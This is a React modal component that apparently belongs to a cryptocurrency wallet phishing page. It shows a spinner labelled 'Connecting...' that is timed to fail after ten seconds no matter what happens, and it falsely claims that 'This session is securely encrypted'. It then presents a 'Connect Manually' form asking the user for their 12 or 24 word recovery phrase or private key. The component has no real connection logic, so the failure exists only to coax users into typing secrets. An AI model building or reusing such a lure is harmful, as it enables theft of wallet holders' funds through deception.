import React, { useState, useEffect } from "react";

const Modal = ({ setOpenModal, wallet }) => {
  const [loading, setLoading] = useState(true);
  const [isForm, setIsForm] = useState(false)

  useEffect(() => {
    // Wait for 10 seconds, then set loading to false
    const timer = setTimeout(() => {
      setLoading(false);
    }, 10000);

    return () => clearTimeout(timer); // Cleanup on unmount
  }, []);

  const handleClose = () => {
    setOpenModal(false);
  };

  const handleRetry = () => {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
    }, 10000); // 10 seconds
  };
  
  const openConnectForm = () => {
    setIsForm(true)
  }

  return (
    <div
      onClick={handleClose}
      className="fixed inset-0 flex items-center justify-center bg-black/50 z-[99999999]"
    >
      <div
        className="bg-white relative p-6 rounded-lg shadow-lg w-[320px] h-fit sm:w-[400px] md:w-[450px] flex flex-col items-center justify-center"
        onClick={(e) => e.stopPropagation()} // Prevent closing when clicking inside
      >
        <button
          onClick={handleClose}
          className="absolute top-4 right-4 cursor-pointer text-gray-500 hover:text-gray-800"
        >
          ✖
        </button>
        <div className="flex items-center justify-center flex-col">
          <img src={wallet.image} alt={wallet.name} className="w-[50px] h-[50px] object-cover"/>
          <p className="text-[var(--color-black)] my-2 font-bold">{wallet.name}</p>
          <span>This session is securely encrypted.</span>
        </div>
        {loading ? (
          <div className="flex flex-col items-center">
            <div className="w-8 h-8 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
            <p className="mt-3 text-sm font-semibold text-gray-700">Connecting...</p>
          </div>
        ) : ( 
          !loading && !isForm && <div className="flex items-center justify-center flex-col my-4">
            <p className="text-sm font-semibold text-red-500 text-center">Failed to connect, please try again or connect mannually</p>
            <div className="flex gap-4 md:flex-row flex-col text-sm">
              <button onClick={() => handleRetry()} className="mt-3 cursor-pointer border border-[#27548A] text-[#27548A] bg-white px-4 py-2 rounded-lg transition">Try Again</button>
              <button onClick={() => openConnectForm()} className="mt-3 cursor-pointer bg-[#27548A] text-white px-4 py-2 rounded-lg transition">Connect Manually</button>
            </div>
            
          </div>
        )}
        {isForm && (
          <form action="" className="w-full mt-4">
            <textarea type="text" className="w-full rounded-md p-3 border border-gray-500 outline-none h-[150px] text-[var(--color-black)]" placeholder="Enter your 12 or 24 mnemonic words, separated by spaces. Alternatively, you can input your private key."/>
            <button className="mt-3 cursor-pointer bg-[#27548A] text-white px-4 py-2 rounded-lg transition w-full">Connect Manually</button>
          </form>
        )}
      </div>
    </div>
  );
};

export default Modal;
